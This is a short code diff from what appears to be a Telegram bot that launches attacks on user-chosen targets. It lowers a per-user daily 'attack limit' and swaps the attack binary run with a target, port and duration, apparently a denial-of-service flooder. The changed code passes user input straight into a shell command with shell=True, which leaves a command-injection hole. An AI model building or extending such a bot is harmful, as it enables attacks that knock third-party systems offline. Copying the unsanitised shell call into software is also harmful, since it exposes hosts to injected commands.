@@ -20,7 +20,7 @@ CHANNEL_USERNAME = "@operabit"
 
 # Default cooldown and attack limits
 COOLDOWN_TIME = 0  # Cooldown in seconds
-ATTACK_LIMIT = 20  # Max attacks per day
+ATTACK_LIMIT = 10  # Max attacks per day
 global_pending_attack = None
 global_last_attack_time = None
 pending_feedback = {}  # यूजर 
@@ -161,7 +161,7 @@ def handle_attack(message):
 
     pending_feedback[user_id] = True  
 
-    full_command = f"./BEAST {target} {port} {time_duration} "
+    full_command = f"./smokey {target} {port} {time_duration} "
 
     try:
         subprocess.run(full_command, shell=True, check=True)
